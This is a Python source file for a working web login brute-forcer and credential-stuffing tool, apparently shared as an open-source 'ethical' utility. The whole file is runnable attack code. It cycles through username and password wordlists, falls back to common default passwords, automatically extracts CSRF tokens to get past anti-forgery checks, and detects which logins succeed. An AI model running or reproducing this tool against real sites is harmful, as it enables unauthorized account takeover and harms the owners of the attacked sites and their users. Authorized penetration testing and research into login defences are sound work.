#!/usr/bin/env python3
"""
Ethical Exploration - Advanced Web Credential Stuffing & Form Brute-Forcer
License: GNU General Public License v3.0 (GPL-3.0)
Description: Automated web form brute-forcing utility with CSRF token extraction,
             user/password matrix attacks, rate-limit delays, and session management.
"""

import argparse
import os
import re
import sys
import time
import urllib.parse

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    import urllib.request
    import urllib.parse
    import urllib.error
    import http.cookiejar
    HAS_REQUESTS = False


def extract_csrf_token(html, token_names=None):
    """Extracts CSRF/anti-forgery tokens from form HTML."""
    if token_names is None:
        token_names = ["csrf_token", "csrf", "_token", "authenticity_token", "user_token", "__RequestVerificationToken"]

    for name in token_names:
        # Match <input ... name="csrf_token" value="abc123xyz" ...>
        patterns = [
            rf'<input[^>]*name=["\']{re.escape(name)}["\'][^>]*value=["\']([^"\']+)["\']',
            rf'<input[^>]*value=["\']([^"\']+)["\'][^>]*name=["\']{re.escape(name)}["\']'
        ]
        for pattern in patterns:
            match = re.search(pattern, html, re.IGNORECASE)
            if match:
                return name, match.group(1)
    return None, None


class WebBruteForcer:
    def __init__(self, url, username=None, user_list=None, password=None, password_list=None,
                 user_field="username", pass_field="password", success_marker=None,
                 failure_marker=None, delay=0.0, extract_csrf=False, headers=None, timeout=10):
        self.url = url
        self.username = username
        self.user_list = user_list
        self.password = password
        self.password_list = password_list
        self.user_field = user_field
        self.pass_field = pass_field
        self.success_marker = success_marker
        self.failure_marker = failure_marker
        self.delay = delay
        self.extract_csrf = extract_csrf
        self.headers = headers or {"User-Agent": "Mozilla/5.0 (SecurityAudit; WebBruteForcer 1.0)"}
        self.timeout = timeout

        if HAS_REQUESTS:
            self.session = requests.Session()
            self.session.headers.update(self.headers)
        else:
            self.cookie_jar = http.cookiejar.CookieJar()
            self.opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(self.cookie_jar))

    def _fetch_page(self, url):
        """Fetches page content to capture initial cookies / CSRF tokens."""
        try:
            if HAS_REQUESTS:
                r = self.session.get(url, timeout=self.timeout)
                return r.text
            else:
                req = urllib.request.Request(url, headers=self.headers)
                with self.opener.open(req, timeout=self.timeout) as resp:
                    return resp.read().decode("utf-8", errors="ignore")
        except Exception as e:
            print(f"[!] Warning: Unable to pre-fetch login page: {e}", file=sys.stderr)
            return ""

    def _send_login(self, data):
        """Dispatches login POST request."""
        if HAS_REQUESTS:
            r = self.session.post(self.url, data=data, timeout=self.timeout, allow_redirects=True)
            return r.status_code, r.text, r.url
        else:
            encoded_data = urllib.parse.urlencode(data).encode("utf-8")
            req = urllib.request.Request(self.url, data=encoded_data, headers=self.headers, method="POST")
            try:
                with self.opener.open(req, timeout=self.timeout) as resp:
                    body = resp.read().decode("utf-8", errors="ignore")
                    return resp.status, body, resp.geturl()
            except urllib.error.HTTPError as e:
                body = e.read().decode("utf-8", errors="ignore")
                return e.code, body, e.geturl()

    def run(self):
        usernames = []
        if self.username:
            usernames.append(self.username)
        elif self.user_list and os.path.isfile(self.user_list):
            with open(self.user_list, "r", encoding="utf-8", errors="ignore") as f:
                usernames = [l.strip() for l in f if l.strip()]
        else:
            usernames = ["admin"]

        passwords = []
        if self.password:
            passwords.append(self.password)
        elif self.password_list and os.path.isfile(self.password_list):
            with open(self.password_list, "r", encoding="utf-8", errors="ignore") as f:
                passwords = [l.strip() for l in f if l.strip()]
        else:
            passwords = ["admin", "password", "123456", "admin123"]

        print(f"[*] Target URL       : {self.url}")
        print(f"[*] Users to test    : {len(usernames)}")
        print(f"[*] Passwords to test: {len(passwords)}")
        print(f"[*] Total attempts   : {len(usernames) * len(passwords)}")
        print("=" * 60)

        for u in usernames:
            for p in passwords:
                data = {self.user_field: u, self.pass_field: p}

                if self.extract_csrf:
                    page_html = self._fetch_page(self.url)
                    token_name, token_val = extract_csrf_token(page_html)
                    if token_name and token_val:
                        data[token_name] = token_val

                try:
                    status, body, final_url = self._send_login(data)
                    body_lower = body.lower()

                    success = False
                    if self.success_marker:
                        if self.success_marker.lower() in body_lower:
                            success = True
                    elif self.failure_marker:
                        if self.failure_marker.lower() not in body_lower and status not in (401, 403):
                            success = True
                    else:
                        if any(term in body_lower for term in ["logout", "dashboard", "welcome", "my account", "login successful"]):
                            success = True
                        elif status in (200, 302) and "incorrect" not in body_lower and "invalid" not in body_lower:
                            if status == 302:
                                success = True

                    if success:
                        print(f"\n[+] CREDENTIAL DISCOVERED: User='{u}' | Password='{p}' (HTTP {status})")
                        return u, p
                    else:
                        print(f"[-] Tried: {u}:{p} -> HTTP {status}", end="\r", flush=True)

                except Exception as ex:
                    print(f"\n[!] Error during request: {ex}", file=sys.stderr)

                if self.delay > 0:
                    time.sleep(self.delay)

        print("\n[-] Attack completed. No valid credential pairs found.")
        return None


def main():
    parser = argparse.ArgumentParser(
        description="Ethical Exploration - Web Form Credential Brute-Forcer with CSRF Support",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""Examples:
  python3 bruteforceweb.py -u https://example.com/login -U admin -P sample_wordlists/passwords.txt
  python3 bruteforceweb.py -u http://127.0.0.1:8080/login --user-list users.txt --pass-list sample_wordlists/passwords.txt --csrf
"""
    )
    parser.add_argument("-u", "--url", default="https://example.com/login", help="Login endpoint URL")
    parser.add_argument("-U", "--username", default="admin", help="Single username to attack")
    parser.add_argument("--user-list", help="Path to username wordlist")
    parser.add_argument("-p", "--password", help="Single password to test")
    parser.add_argument("-P", "--pass-list", default="sample_wordlists/passwords.txt", help="Path to password wordlist")
    parser.add_argument("--user-field", default="username", help="HTML field name for username")
    parser.add_argument("--pass-field", default="password", help="HTML field name for password")
    parser.add_argument("-s", "--success-marker", help="String indicating successful login")
    parser.add_argument("-f", "--failure-marker", help="String indicating failed login")
    parser.add_argument("-d", "--delay", type=float, default=0.0, help="Delay between requests in seconds")
    parser.add_argument("--csrf", action="store_true", help="Auto-extract CSRF tokens before POSTing")
    parser.add_argument("--timeout", type=int, default=10, help="Request timeout in seconds")

    args = parser.parse_args()

    engine = WebBruteForcer(
        url=args.url,
        username=args.username,
        user_list=args.user_list,
        password=args.password,
        password_list=args.pass_list,
        user_field=args.user_field,
        pass_field=args.pass_field,
        success_marker=args.success_marker,
        failure_marker=args.failure_marker,
        delay=args.delay,
        extract_csrf=args.csrf,
        timeout=args.timeout
    )
    engine.run()


if __name__ == "__main__":
    main()
